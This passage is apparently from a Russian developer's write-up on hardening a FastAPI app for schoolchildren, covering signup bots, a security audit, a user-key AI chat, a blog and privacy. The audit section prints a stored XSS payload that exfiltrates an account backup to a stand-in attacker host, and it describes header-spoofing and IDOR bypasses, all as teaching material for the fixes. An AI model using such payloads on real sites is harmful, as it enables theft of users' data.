+| Сразу следом меняю X-Forwarded-For в каждом запросе | 429: 0, 401: 40 — лимит не сработал ни разу |
+
+Смотрите, в чём соль второй строки. Если бы заголовок игнорировался, вторая фаза унаследовала бы уже забитый счётчик реального адреса и отдала бы 429 на первом же запросе. Она отдала ноль. Сорок раз подряд.
+
+То есть любой мой лимит по IP обходился одной строкой. Регистрация, логин, антифлуд на публичных страницах — всё.
+
+Чинится в двух местах. На сервере — правильным значением флага:
+
+`
+--forwarded-allow-ips=127.0.0.1
+`
+
+А в приложении я перестал зависеть от того, как именно запущен uvicorn, и стал брать адрес сам:
+
+`python
+def client_ip(request: Request) -&gt; str | None:
+    """Настоящий адрес клиента, который нельзя подделать заголовком.
+
+    nginx дописывает реальный адрес СПРАВА ($proxy_add_x_forwarded_for),
+    поэтому берём последний элемент — он проставлен нашим прокси,
+    а не гостем.
+    """
+    forwarded = request.headers.get("x-forwarded-for")
+    if forwarded:
+        parts = [p.strip() for p in forwarded.split(",") if p.strip()]
+        if parts:
+            return parts[-1]
+    return request.client.host if request.client else None
+`
+
+Честно про ограничение: «брать правый» верно ровно для одного прокси. Если перед вами цепочка вроде CDN → nginx, правым окажется адрес первого прокси — не настоящий клиент, но и не подделываемый. Огрубление, а не дыра.
+
+Мораль: если приложение принимает решения по IP, оно обязано знать, какому источнику этого IP доверяет. '*' — это не «доверяй прокси». Это «доверяй кому угодно».
+
+
+═══ H2: Дыра третья: подтверждение почты, которое ничего не подтверждало ═══
+
+
+В базе была колонка email_verified_at. Письмо уходило, ссылка работала, дата проставлялась. Всё как у людей.
+
+Потом я поискал по проекту, где эта колонка проверяется перед доступом к функциям. И не нашёл ни одного места. Зато нашёл в сервисе аутентификации честный комментарий, который сам же когда-то и написал:
+
+`python
+EMAIL VERIFICATION IS "SOFT": UNVERIFIED USERS MAY SIGN IN.
+
+`
+
+То есть бот регистрировался и сразу пользовался аккаунтом. Подтверждение почты было украшением. Красивым, бесполезным.
+
+Дальше я принял решение, с которым кто-то не согласится: жёсткую проверку я делать не стал. Потому что письма теряются. Падают в спам. Приходят на ящик, к которому у школьника нет доступа с телефона. Жёсткий гейт отрезал бы живых людей ради ботов, которых можно поймать дешевле.
+
+Вместо этого — автоудаление. Аккаунт, у которого разом не подтверждена почта, нет ни одной задачи, нет привязки к Telegram и профиля репетитора, через 30 дней удаляется сам.
+
+
+═══ H2: Что я поставил вместо ═══
+
+
+Три меры. Ни одна не требует JavaScript — бот его не исполняет, а живой браузер проходит проверки и не замечает.
+
+1. Подписанная метка времени формы. Кладём в форму время, когда её отрисовали. Обязательно подписанное — иначе бот просто подставит «пять секунд назад» и будет проходить всегда:
+
+`python
+def issue_form_token() -&gt; str:
+    ts = f"{datetime.now(UTC).timestamp():.0f}"
+    return f"{ts}.{_sign(ts)}"
+
+def _sign(ts: str) -&gt; str:
+    secret = get_settings().app_secret_key.encode()
+    return hmac.new(secret, f"register:{ts}".encode(), hashlib.sha256).hexdigest()[:32]
+
+def check_form_timing(token: str | None) -&gt; None:
+    stale = "Форма устарела, обнови страницу."
+    if not token or "." not in token:
+        raise SignupRejected(stale, log_code="no_timestamp")
+
+    ts, _, signature = token.partition(".")
+    if not hmac.compare_digest(signature, _sign(ts)):
+        raise SignupRejected(stale, log_code="bad_signature")
+
+    elapsed = datetime.now(UTC).timestamp() - float(ts)
+    if elapsed &lt; MIN_FORM_SECONDS:
+        raise SignupRejected("Слишком быстро — заполни форму ещё раз.", log_code="too_fast")
+    if elapsed &gt; MAX_FORM_SECONDS:
+        raise SignupRejected(stale, log_code="expired")
+`
+
+Это убивает весь класс «прямой POST по списку URL». Бот либо не пришлёт метку вовсе, либо пришлёт свою — и подпись не сойдётся.
+
+2. Счёт регистраций по базе, а не в памяти. У пользователя появились две колонки: signup_ip и signup_subnet — первые три октета. Подсеть здесь важнее адреса: поменять последний октет не стоит ничего.
+
+`python
+MAX_PER_IP_HOUR = 5
+MAX_PER_SUBNET_HOUR = 30
+`
+
+Запас нарочно щедрый, и вот почему. Моя аудитория сидит за школьным NAT и за CGNAT мобильных операторов, где сотню человек видно как один адрес. Cloudflare публиковал измерение: CGNAT-адреса попадают под ограничения втрое чаще, при этом ботов среди них меньше. Урок информатики, на котором класс регистрируется одновременно, не должен упереться в мой лимит — иначе я решу проблему ботов ценой живых пользователей.
+
+И отдельная защита от себя же. Если приложение видит внутренний адрес — 127.0.0.1 или что-то из приватных диапазонов, — значит прокси не проставил заголовок и настоящий клиент нам просто неизвестен. Считать всех одним человеком в такой ситуации нельзя: регистрация закроется всему сайту после пятой за час.
+
+`python
+if not ip or _is_internal(ip):
+    return
+`
+
+3. Проверка, существует ли домен почты. Вот тут меня ждал сюрприз.
+
+Я собрался прикручивать списки одноразовых почт — классика жанра. Полез сверять со своими данными и обнаружил, что против моих ботов они бесполезны: ни один из наблюдавшихся доменов не был temp-mail.
+
+Зато помните sdffsd.sdd, flsdfmsodf.ro и prweorwef.com? Это NXDOMAIN. Ни MX, ни A-записи. Письмо туда физически не уйдёт — домена не существует.
+
+Одна DNS-проверка выносит их целиком:
+
+`python
+def _probe_domain(domain: str) -&gt; bool:
+    from email_validator import EmailUndeliverableError, validate_email
+
+    try:
+        validate_email(f"probe@{domain}", check_deliverability=True, timeout=3)
+    except EmailUndeliverableError:
+        return False
+    except Exception:
+        # Таймаут, сбой резолвера — пропускаем. Отказать живому человеку
+        # из-за нашей же сетевой проблемы хуже, чем пропустить бота.
+        return True
+    return True
+
+_domain_has_mail = lru_cache(maxsize=4096)(_probe_domain)
+`
+
+Резолвер синхронный, поэтому в приложении он уезжает в отдельный поток: регистрация — не то место, где стоит блокировать event loop на секунду.
+
+Чего я делать не стал и вам не советую: отсекать адреса по признаку «много цифр подряд». У меня полно живых пользователей, у которых вместо имени ящика телефон — 79161234567@mail.ru. Правило, которое ловит ботов вместе с людьми, хуже, чем отсутствие правила.
+
+
+═══ H2: И сигнализация ═══
+
+
+Те 176 ботов я заметил постфактум, разбирая базу руками. Это, если честно, обиднее всего остального.
+
+Теперь при каждой регистрации считается число аккаунтов за последний час, и если оно переваливает за двадцать — мне приходит письмо. Повторное не чаще раза в час, все ошибки внутри глушатся: сигнализация не имеет права уронить регистрацию.
+
+Самая дешёвая мера из всех и самая недооценённая. Защиту рано или поздно обойдут. А вот незамеченной волна оставаться не должна.
+
+---
+
+ЧАСТЬ 2. АУДИТ: ДВЕНАДЦАТЬ ДЫР, К БОТАМ ОТНОШЕНИЯ НЕ ИМЕВШИХ
+
+
+Раз уж я всё равно копался в безопасности, то прошёл проект целиком: авторизация, права доступа, платежи, хранение секретов, XSS, SSRF. Ниже — то, что стоило починить, с объяснением механики. Всё закрыто тестами.
+
+
+═══ H2: Хранимый XSS через JSON-LD ═══
+
+
+Моя любимая находка. Красивая, как в учебнике.
+
+На публичных страницах школьного Q&amp;A стоит разметка для поисковиков:
+
+`python
+"jsonld": json.dumps(jsonld, ensure_ascii=False),
+`
+
+`html
+&lt;script type="application/ld+json"&gt;{{ jsonld | safe }}&lt;/script&gt;
+`
+
+Выглядит безопасно, правда? json.dumps экранирует кавычки и слэши, вырваться из строки нельзя.
+
+Только HTML-парсер про JSON ничего не знает. Он закрывает &lt;script&gt; на первой же последовательности &lt;/script, где бы она ни лежала — хоть внутри JSON-строки, хоть внутри чего угодно. А в эту разметку едет заголовок вопроса, который пишет любой зарегистрированный пользователь:
+
+`
+Как решить&lt;/script&gt;&lt;script&gt;fetch('/api/backup/export',{credentials:'include'})
+  .then(r=&gt;r.text()).then(t=&gt;navigator.sendBeacon('https://attacker.tld/x',t))&lt;/script&gt;задачу
+`
+
+Страница вопроса публичная. Скрипт выполнялся бы у каждого посетителя, включая залогиненных. А /api/backup/export отдаёт полный дамп аккаунта — задачи, проекты, всё.
+
+Лечится одним слоем, через который теперь проходит любой JSON, попадающий внутрь &lt;script&gt;:
+
+`python
+_REPLACEMENTS = (
+    ("&lt;", "\\u003c"),
+    ("&gt;", "\\u003e"),
+    ("&amp;", "\\u0026"),
+    (" ", "\\u2028"),
+    (" ", "\\u2029"),
+)
+
+def script_json(data: Any) -&gt; str:
+    """Сериализовать данные для вставки в &lt;script&gt; внутри шаблона."""
+    out = json.dumps(data, ensure_ascii=False)
+    for char, escaped in _REPLACEMENTS:
+        out = out.replace(char, escaped)
+    return out
+`
+
+Для JSON &lt; — тот же самый символ &lt;. Для HTML-парсера — обычные буквы. U+2028 и U+2029 добавлены не для красоты: они валидны в JSON, но рвут строку для JavaScript-парсера.
+
+Мораль: «я экранировал JSON» и «это безопасно внутри &lt;script&gt;» — два разных утверждения. Между ними стоит HTML-парсер со своими правилами, и ему на ваш JSON плевать.
+
+
+═══ H2: IDOR: чужие задачи по идентификатору проекта ═══
+
+
+Сервис списка задач выглядел так:
+
+`python
+if project_id is not None:
+    # Project-scoped view: show all members' tasks in that project.
+    stmt = select(Task).where(Task.project_id == project_id)
+else:
+    stmt = select(Task).where(Task.user_id == user_id)
+`
+
+При заданном project_id фильтр по владельцу снимается. Это осознанное поведение: внутри проекта участники видят задачи друг друга. А проверку членства должен делать вызывающий код — про это даже в докстринге написано.
+
+HTML-страница проекта так и делала. Проверяла, потом звала сервис.
+
+А JSON-ручка GET /api/tasks?project_id=&lt;uuid&gt; — нет. Просто передавала идентификатор дальше.
+
+Итог: любой авторизованный пользователь, знающий id проекта, читал все его задачи. И самый реальный сценарий тут даже не «злоумышленник угадал uuid», а исключённый участник. Его выкинули из проекта, все остальные ручки честно отвечают 404 — а эта продолжает отдавать данные. Вечно.
+
+Правка на три строки, но в правильном месте — внутри сервиса, а не в вызывающем коде:
+
+`python
+if project_id is not None:
+    if not await is_member(session, project_id, user_id):
+        raise ProjectNotFound(str(project_id))
+    stmt = select(Task).where(Task.project_id == project_id)
+`
+
+Мораль: «вызывающий обязан проверить» — это не защита, а договорённость. Договорённости нарушаются молча и без ошибок в логах. Проверка живёт там, где данные.
+
+
+═══ H2: Аноним, забивающий чужой календарь ═══
+
+
+В кабинете репетитора есть публичная страница записи: клиент выбирает свободное время и записывается. Без авторизации — так и задумано, иначе никто не запишется.
+
+Свободные слоты считает функция, которая учитывает рабочие дни, часы, буфер между занятиями, отпуск, запас на подготовку и уже занятое время. Хорошая функция, я ей горжусь.
+
+Вот только сервер принимал время из формы как есть и проверял ровно одно: не занято ли оно другой записью. Всё остальное — рабочие часы, отпуск, «не в прошлом» — было фильтрами исключительно для интерфейса.
+
+Что это значит на практике: анонимный POST мог записать клиента на три часа ночи, в отпуск, на прошлую неделю или на 2031 год. А каждая подтверждённая запись становится занятым интервалом. Календарь репетитора забивается на месяцы вперёд за минуту работы скрипта.
+
+И второй слой, который я заметил уже по ходу: поле почты клиента было объявлено обычной строкой, а не валидируемым адресом. А оттуда уходит письмо. То есть форма записи работала бесплатным релеем с моей SMTP-личности на любой адрес в интернете.
+
+Теперь слот обязан принадлежать сетке:
+
+`python
+async def ensure_slot_bookable(session, *, tutor, service, slot) -&gt; None:
+    if slot.tzinfo is None:
+        slot = slot.replace(tzinfo=UTC)
+    free = await find_free_slots(
+        session, tutor, date_from=slot, date_to=slot + timedelta(minutes=1), service=service
+    )
+    if slot not in free:
+        raise BookingConflictError("Это время уже занято или недоступно для записи")
+`
+
+Проверка стоит только на публичных путях. Репетитор в своём кабинете вправе поставить встречу вне сетки — это его календарь. Гость с улицы — нет.
+
+
+═══ H2: Утечка через iCal-фид ═══
+
+
+Репетитору предлагается подписаться на свой календарь в Google Calendar или Apple Calendar: ссылка с токеном, внутри события. Удобно.
+
+А в описании каждого события лежало вот это:
+
+`
+Клиент: Иван Петров
+Email: ivan@example.com
+Управление: https://getdoday.ru/lessio/manage/&lt;manage_token&gt;
+`
+
+manage_token — это capability-ссылка. По ней можно отменить или перенести запись без всякой авторизации, потому что знание ссылки и есть право.
+
+Теперь сложим. Ссылку на фид репетитор своими руками отдаёт стороннему календарному сервису. Едет она в query-строке, а значит оседает в логах nginx и в заголовке Referer. И содержит персональные данные всех клиентов и токены управления их записями.
+
+Убрал и почты, и токены. Осталось имя — репетитору всё-таки нужно понимать, кто к нему придёт.
+
+
+═══ H2: Сессия, которую нельзя было отозвать ═══
+
+
+Сессия жила только в подписанной cookie. Никакого серверного состояния — красиво, быстро, без базы.
+
+У этой красоты есть цена: отозвать такую сессию нечем.
+
+Смена пароля меняла хеш. А украденная cookie продолжала работать все две недели, на которые Starlette по умолчанию выписывает сессию. Человек меняет пароль именно потому, что боится за аккаунт, — и не меняет ничего.
+
+Решение — поколение сессий. Одно целое число у пользователя, кладётся в cookie при входе, сверяется на каждом запросе:
+
+`python
+user = await session.get(User, uid)
+if user is None:
+    return None
+У COOKIE, ВЫПИСАННЫХ ДО ПОЯВЛЕНИЯ ЭТОГО ПОЛЯ, НОМЕРА НЕТ —
+
+СЧИТАЕМ ИХ НУЛЕВЫМИ, ЧТОБЫ НИКОГО НЕ РАЗЛОГИНИТЬ НА РОВНОМ МЕСТЕ.
+
+if int(request.session.get("epoch", 0)) != user.session_epoch:
+    request.session.clear()
+    return None
+return user
+`
+
+Смена пароля увеличивает номер — и все прочие сессии перестают подходить. В том числе та, из-за которой пароль и меняли. Текущая остаётся живой: ей номер обновляют сразу.
+
+
+═══ H2: Остальное — скороговоркой ═══
+
+
+• Токен школьного дневника лежал в базе открытым текстом. Приложение умеет тянуть домашку из электронного дневника; токен доступа хранился текстом — с комментарием «зашифровать перед продом», который я сам себе и написал. Теперь Fernet, ключ выводится из секрета приложения через PBKDF2, соль своя. Старые записи читаются как есть и перешифровываются при следующем сохранении.
+• Cookie уезжали в соседний проект. Прокси на игру, живущую на соседнем порту, пересылал заголовки целиком — вместе с cookie сессии основного сайта. И пропускал обратно её Set-Cookie. Вырезал в обе стороны.
+• CSRF-исключение шире, чем нужно. Из-под проверки источника был выведен целый префикс, хотя своя авторизация была только у одной ручки.
+• SSRF в «своём провайдере» — про него подробно в следующей части, там он к месту.
+• Токен подтверждения почты писался в лог целиком. Живёт трое суток. Кто читает логи — подтверждает чужие почты.
+• Content-Security-Policy приложение не отдавало вовсе. Единственная жила в конфиге nginx и только в одном location. Теперь ставится всегда. 'unsafe-inline' пришлось оставить — весь интерфейс на инлайновом Alpine, — но connect-src 'self' закрывает главный сценарий: даже если чужой скрипт как-то выполнится, отправить украденное наружу он не сможет.
+• Подпись платёжного уведомления сравнивалась обычным ==. Заменил на hmac.compare_digest — по сети это почти не эксплуатируется, но пусть будет правильно.
+
+---
+
+ЧАСТЬ 3. ИИ-ПОМОЩНИК, КОТОРЫЙ РАБОТАЕТ НА КЛЮЧЕ ПОЛЬЗОВАТЕЛЯ
+
+
+История вторая. Про то, как добавить ИИ в бесплатный продукт и не разориться.
+
+Картинка: s-03-ai-chat.png — чат с моделью внутри приложения, разбор задачи по физике.
+
+
+═══ H2: Почему не мой ключ ═══
+
+
+Очевидное решение: берём ключ провайдера, кладём в переменные окружения, раздаём ответы всем. Три причины, почему я так не сделал.
+
+Деньги. Аудитория — школьники, продукт бесплатный. Любой всплеск популярности превращается в счёт, который оплачиваю я. Один цикл в чьём-нибудь скрипте — и баланс кончился за ночь.
+
+Ответственность. Если ключ мой, то запросы к модели делаю я. Значит, за содержимое диалогов отвечаю тоже я.
+
+Закон. Запрос к зарубежному провайдеру — это трансграничная передача персональных данных. Для российского сервиса с несовершеннолетней аудиторией это отдельная песня, к которой я ещё вернусь.
+
+Поэтому схема такая: каждый подключает свой ключ. Не зависит от моих лимитов, я не читаю чужие разговоры, счёт приходит тому, кто его тратит. Всем хорошо.
+
+Картинка: s-04-ai-key-settings.png — экран подключения ключа: провайдер, пошаговая инструкция, поле ключа.
+
+
+═══ H2: Как хранить чужой ключ ═══
+
+
+Ключ — это секрет пользователя, который лежит в моей базе. Шифрование не обсуждается:
+
+`python
+KEY_VERSION = 1
+_SALT_V1 = b"doday-ai-provider-key-v1"
+
+def _fernet_for_version(version: int) -&gt; Fernet:
+    if version != KEY_VERSION:
+        raise AiKeyError(f"неизвестная версия ключа шифрования: {version}")
+    secret = get_settings().app_secret_key.encode("utf-8")
+    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=_SALT_V1, iterations=100_000)
+    return Fernet(base64.urlsafe_b64encode(kdf.derive(secret)))
+`
+
+Два решения, которые стоит пояснить.
+
+Ключ шифрования выводится из секрета приложения детерминированно. Не хранится отдельно, не требует внешнего хранилища секретов и переживает рестарт — а рестартует у меня всё постоянно, деплой же.
+
+Версия схемы лежит рядом с шифротекстом. Когда понадобится сменить соль или алгоритм, добавится ветка в _fernet_for_version, а старые записи продолжат читаться. Одно поле в таблице экономит будущую миграцию данных. Дёшево сейчас, спасает потом.
+
+Обратно ключ не показывается никогда и никому — в интерфейсе только последние четыре символа.
+
+
+═══ H2: Стриминг ответа в FastAPI ═══
+
+
+В FastAPI 0.115 нет отдельного примитива для server-sent events, так что SSE собирается руками:
+
+`python
+return StreamingResponse(
+    events(),
+    media_type="text/event-stream",
+    headers={
+        "Cache-Control": "no-cache",
+        "Connection": "keep-alive",
+        # Без этого nginx буферизует ответ и стрим превращается
+        # в «ничего не происходит, потом всё сразу».
+        "X-Accel-Buffering": "no",
+    },
+)
+`
+
+Метод — POST: EventSource в браузере умеет только GET, а вопрос удобнее отправлять телом. На фронте — fetch плюс ReadableStream.
+
+Заголовок X-Accel-Buffering: no nginx уважает, но я всё равно продублировал настройку в конфиге отдельным location — на случай, если панель хостинга однажды перегенерирует конфиг и заголовок останется единственной надеждой:
+
+`nginx
+location /api/ai/stream {
+    proxy_pass http://127.0.0.1:8011;
+    proxy_http_version 1.1;
+    proxy_buffering off;
+    proxy_cache off;
+    gzip off;
+    proxy_read_timeout 3600s;
+}
+`
+
+gzip off тут не паранойя: сжатие тоже буферизует.
+
+
+═══ H2: Грабля, которая съедала ответы ═══
+
+
+А теперь лучшая история этой части.
+
+Пользователь пишет: «спросил, ИИ не договорил, а когда я ушёл со страницы и вернулся — в истории пусто».
+
+Смотрим код сохранения ответа:
+
+`python
+async def events() -&gt; AsyncIterator[str]:
+    collected: list[str] = []
+    try:
+        async for chunk in stream_completion(...):
+            collected.append(chunk)
+            yield f"data: {chunk}\n\n"
+    except AiProviderError as exc:
+        yield f"event: error\ndata: {exc.user_message}\n\n"
+        return
+    finally:
+        # Сохраняем даже частичный ответ: пользователь его уже прочитал.
+        answer = "".join(collected).strip()
+        if answer:
+            await save_message(session, user.id, role="assistant", content=answer)
+    yield "event: done\ndata: ok\n\n"
+`
+
+Логика выглядит пуленепробиваемой. Что бы ни случилось — finally сохранит собранное. Я даже комментарий заботливый написал.
+
+Проблема в том, что finally в асинхронном генераторе выполняется в крайне неудачный момент. Когда клиент отваливается, генератор закрывают — и внутрь, прямо в точку yield, прилетает GeneratorExit. А мы в этот момент честно пытаемся сделать await к базе, сессия которой уже закрывается вместе с оборванным соединением. Плюс yield после GeneratorExit — это RuntimeError: async generator ignored GeneratorExit.
+
+Итог ровно тот, который описал пользователь. Ушёл со страницы — ответ, который он уже прочитал глазами, не сохранился нигде.
+
+Правильное решение — не пытаться героически дописать всё в конце, а писать по ходу:
+
+`python
+saved_id: UUID | None = None
+saved_len = 0
+async for chunk in stream_completion(...):
+    collected.append(chunk)
+    yield f"data: {chunk}\n\n"
+    text = "".join(collected)
+    if len(text) - saved_len &gt;= _SAVE_EVERY_CHARS:   # каждые 100 символов
+        saved_id = await save_answer_progress(
+            session, user.id, task_id=task_id, message_id=saved_id, content=text
+        )
+        saved_len = len(text)
+`
+
+Финальная запись переехала из finally в обычный ход выполнения. Оборвалось соединение — до неё просто не дойдём, и это уже нормально: в базе лежит то, что было на экране.
+
+Мораль: finally в асинхронном генераторе — не место для работы с внешними ресурсами. Состояние, которое нужно сохранить, сохраняйте по мере появления, а не «в конце».
+
+
+═══ H2: Грабли провайдеров ═══
+
+
+Приложение говорит с моделями по OpenAI-совместимому протоколу. Значит, код общения один, различаются только адрес и название модели. В теории.
+
+Один провайдер на неверный ключ отвечает 400, а не 401. Классификация ошибок по коду ломается сразу: человек видит «провайдер не отвечает» вместо «проверьте ключ» и идёт чинить не то.
+
+Ключи Google теперь начинаются на AQ.Ab, а не на AIza. Я честно написал в подсказке «AIza…», и пользователь с новым ключом решил, что скопировал что-то не то. Мелочь, а полчаса переписки.
+
+Ошибка одного провайдера может прийти от совсем другого. Реальный диалог из поддержки: «пишет, что ключ не принят», а в ответе провайдера — invalid api key secret: illegal base64 data at input byte 0. Я пошёл проверять, кто отдаёт такую фразу. Оказалось — не тот провайдер, у которого пользователь брал ключ. В форме по умолчанию стоял один, а инструкция сверху рисовалась для другого, и выпадающий список выглядел как «уже выбрано что надо».
+
+Отсюда правило, до которого стоило додуматься сразу: выбранный провайдер должен совпадать с тем, чью инструкцию человек читает, а заголовок инструкции — называть его по имени.
+
+И главное. Проверка адреса заведомо неверным ключом не доказывает ничего.
+
+Я простучал десяток провайдеров с российского адреса, получил осмысленные ошибки авторизации и сделал вывод, что они работают. Логично же: отвечает — значит доступен.
+
+А потом пользователь подключил настоящий ключ Google и получил:
+
+`json
+{"error": {"code": 400, "message": "User location is not supported for the API use.",
+           "status": "FAILED_PRECONDITION"}}
+`
+
+Запрос уходит с моего сервера, а он в России. С невалидным ключом Google отвечает про ключ раньше, чем доходит до проверки страны. Моя проверка дала ложноположительный результат, а расплатился за это пользователь, прошедший всю инструкцию до конца.
+
+Теперь у геоблока своё сообщение, отдельное от «неверный ключ»:
+
+`python
+_GEO_MARKERS = ("location is not supported", "country", "not available in your region")
+
+if status == 400:
+    if any(marker in body.lower() for marker in _GEO_MARKERS):
+        return _GEO_MESSAGE
+    if _looks_like_bad_key(body):
+        return _BAD_KEY_MESSAGE
+`
+
+И ещё одна деталь, которая экономит часы поддержки: к нашему человеческому сообщению добавляется ответ самого провайдера — с вырезанным ключом, без разметки, не длиннее 300 символов. Без него человек видит «ключ не принят» и не понимает, что чинить: ключ, модель или тариф.
+
+
+═══ H2: SSRF, который я сам себе принёс ═══
+
+
+В списке провайдеров есть пункт «свой, OpenAI-совместимый»: пользователь вводит адрес API. Проверка была одна:
+
+`python
+if not resolved_url.startswith("https://"):
+    raise UnknownProvider("адрес API должен начинаться с https://")
+`
+
+То есть пользователь мог указать внутренний адрес, а мой сервер послушно пошёл бы туда. Со своего же места в сети. А разные сообщения об ошибках для разных кодов ответа превращали это в удобный сканер внутренней сети.
+
+`python
+def _check_public_url(url: str) -&gt; None:
+    host = urlparse(url).hostname
+    if not host:
+        raise UnknownProvider("не разобрал адрес API")
+    try:
+        infos = socket.getaddrinfo(host, None)
+    except OSError as exc:
+        raise UnknownProvider("не удалось разобрать имя хоста в адресе API") from exc
+    for info in infos:
+        ip = ipaddress.ip_address(info[4][0])
+        if not ip.is_global or ip.is_multicast:
+            raise UnknownProvider("этот адрес ведёт во внутреннюю сеть — так нельзя")
+`
+
+Гонка «резолв → запрос» здесь остаётся, я про неё знаю. Для модели угроз «школьник с формой в настройках» этого достаточно. Для сервиса, где адрес вводит кто угодно, нужен резолв с фиксацией адреса и запрет редиректов.
+
+---
+
+ЧАСТЬ 4. СЕМАНТИЧЕСКОЕ ЯДРО И 334 СТАТЬИ
+
+
+История третья, про рост.
+
+Продукт для школьников не продвинешь платной рекламой: у аудитории нет денег, а конверсия в оплату низкая по определению. Остаётся поиск.
+
+Картинка: s-02-blog-article.png — статья блога: полоса прогресса чтения, липкое оглавление справа с подсветкой активного раздела, время чтения.
+
+
+═══ H2: Контент как код, а не как база ═══
+
+
+Первое решение сэкономило мне недели: статьи — это markdown-файлы в репозитории, а не записи в базе с админкой.
+
+`
+app/blog/
+  _types.py        # Category, TocItem, FaqItem, Post
+  categories.py    # 11 категорий
+  loader.py        # frontmatter → HTML, оглавление, время чтения
+  posts.py         # поиск со скорингом, похожие статьи
+  cache.py         # дисковый кэш по отпечатку файлов
+  router.py        # /blog, /blog/c/{cat}, /blog/{slug}, feed.xml, sitemap.xml
+  content/
+    domashka/kak-bystro-sdelat-domashnee-zadanie.md
+    ...
+`
+
+Что это даёт: правки идут через git с историей и ревью, статьи проверяются автотестами, для публикации не нужна админка, деплой — тот же git push. Минус ровно один: чтобы поправить опечатку, нужен доступ к репозиторию. Для проекта одного человека это, честно говоря, не минус.
+
+Каждая статья начинается с frontmatter:
+
+`
+---
+title: Как быстро сделать домашнее задание: система из 7 шагов
+summary: Домашка съедает весь вечер? Разбираем рабочую систему...
+category: domashka
+tags: дз, продуктивность, тайм-менеджмент
+keywords: как быстро сделать домашнее задание, как делать уроки быстро
+published: 2026-08-25
+emoji: ⚡
+faq: true
+---
+`
+
+Обратите внимание на faq: true. Он означает, что в теле есть раздел «Частые вопросы» с подзаголовками-вопросами, и из него собирается разметка FAQPage. Одно поле в шапке файла — расширенный сниппет в выдаче.
+
+
+═══ H2: Автопроверки вместо вычитки ═══
+
+
+334 статьи невозможно перечитывать глазами перед каждым деплоем. Поэтому есть скрипт, который гоняется как обычный тест и проверяет: валидность frontmatter, уникальность slug, минимальный объём, наличие хотя бы четырёх подзаголовков второго уровня, наличие блока FAQ, существование всех внутренних ссылок и категории.
+
+А ещё — список запрещённых утверждений:
+
+`python
+_FORBIDDEN = (
+    ("14 дней pro", "триала нет — нельзя обещать 14 дней Pro"),
+    ("14 дней бесплатно", "триала нет"),
+    ("saml", "SAML SSO в продукте нет"),
+)
+`
+
+Пояснение к последнему пункту. Обещание функции, которой нет, — это не «маркетинговая вольность». Это причина, по которой человек приходит, не находит обещанного и больше не возвращается. Проверка в CI дешевле, чем разбор такой жалобы.
+
+
+═══ H2: Как раздел перестал открываться 11 секунд ═══
+
+
+Первая версия парсила все markdown-файлы при обращении. С тремя сотнями статей главная блога открывалась 11,7 секунды.
+
+Это не «медленно». Это сломано.
+
+Решение — дисковый кэш, ключом к которому служит отпечаток корпуса: имена файлов, размеры, время изменения. Изменился хоть один файл — отпечаток другой, кэш перестраивается. Не изменился — читается готовый JSON. Плюс прогрев в фоновом потоке при старте, чтобы первый посетитель не оплачивал разбор своим ожиданием.
+
+Стало 0,67 секунды. В семнадцать раз быстрее.
+
+Отдельно про формат кэша: JSON, а не pickle. Pickle быстрее и удобнее, но это исполняемый формат — файл кэша, до которого кто-то дотянулся, превращается в выполнение произвольного кода. Экономия миллисекунд того не стоит.
+
+
+═══ H2: Что в интерфейсе статьи ═══
+
+
+Три вещи, ради которых стоило повозиться с фронтом:
+
+• полоса прогресса чтения сверху — простая, но заметно снижает желание бросить длинный текст на середине;
+• липкое оглавление справа с подсветкой активного раздела через IntersectionObserver, на мобильном сворачивается в &lt;details&gt;;
+• время чтения и количество слов — честные, считаются из текста, а не проставляются руками.
+
+Картинка: s-06-blog-mobile.png — тот же раздел на мобильном.
+
+
+═══ H2: Индексация ═══
+
+
+Sitemap собирается динамически из того же источника, что и сам блог, — рассинхрон в принципе невозможен. Плюс Atom-фид, разметка BlogPosting и BreadcrumbList на каждой статье, канонические адреса. И IndexNow — пинг поисковикам о новых адресах, чтобы не ждать, пока краулер дойдёт сам.
+
+---
+
+ЧАСТЬ 5. ПРИВАТНОСТЬ КАК ИНЖЕНЕРНАЯ ЗАДАЧА
+
+
+Финальная история, короткая. Но продукт она изменила сильнее, чем всё остальное.
+
+Разбираясь с законом о персональных данных, я дошёл до трансграничной передачи. Правило простое: данные уходят за пределы страны — это отдельная история с отдельным уведомлением регулятора.
+
+А у меня в списке ИИ-провайдеров половина зарубежных. Ключ вводит пользователь, но передачу инициирует мой сервер, и текст вопроса — это данные пользователя.
+
+Я убрал всех зарубежных провайдеров. Остались российские.
+
+Цена честная: пропали бесплатные варианты, у оставшихся нужна карта. Зато вопрос трансграничной передачи закрыт полностью, а не «наверное, обойдётся».
+
+Ещё три правки в ту же сторону, все про «не хранить лишнего»:
+
+IP регистрации живёт сутки. Он нужен ровно на час — по нему считается частота регистраций с адреса и подсети. Дальше это бесполезный, но чувствительный след.
+
+Брошенные аккаунты удаляются через 30 дней — те, где разом нет подтверждения почты, ни одной задачи, привязки к Telegram и профиля репетитора.
+
+Страница «Мои данные». Человек видит, что о нём хранится: почта, дата регистрации, счётчики задач и сообщений, подключён ли дневник, лежит ли ещё IP. Там же выгрузка одним файлом и удаление аккаунта.
+
+Картинка: s-05-my-data.png — страница «Мои данные»: что хранится, кнопки «скачать» и «удалить».
+
+Последнее — самое недооценённое. Жалобы в надзор почти никогда не начинаются с утечки. Они начинаются с того, что человек не понял, что о нём собрали, и не смог это забрать. Две кнопки снимают повод писать куда-либо.
+
+Заодно я перечитал свою же политику конфиденциальности и нашёл там фразу «никаких аналитических сторонних трекеров» — при том что на всех страницах стоит счётчик веб-аналитики. Написано это было когда-то честно. Потом продукт изменился, а текст остался.
+
+Мораль: политика конфиденциальности — не юридический артефакт, который пишут один раз и забывают. Это документация продукта. И устаревает она ровно так же, как README.
+
+---
+
+ЦИФРЫ И СТЕК
+
+
+| Что | Сколько |
+|---|---|
+| Строк кода | 86 010 (38 012 Python + 26 851 шаблоны + 21 147 тесты) |
+| Тестов | 1325 |
+| Коммитов | 768 |
+| Миграций | 59 |
+| Модулей приложения | 43 |
+| Статей блога | 334 (617 186 слов) |
+| Возраст проекта | 4 месяца |
+
+Стек: FastAPI, async SQLAlchemy 2.0, Pydantic v2, PostgreSQL, Alembic, Jinja2, HTMX, Alpine.js, Tailwind. Инструменты: uv, ruff, mypy --strict, GitHub Actions. Деплой — git push: автопулл, миграции, рестарт, примерно минута.
+
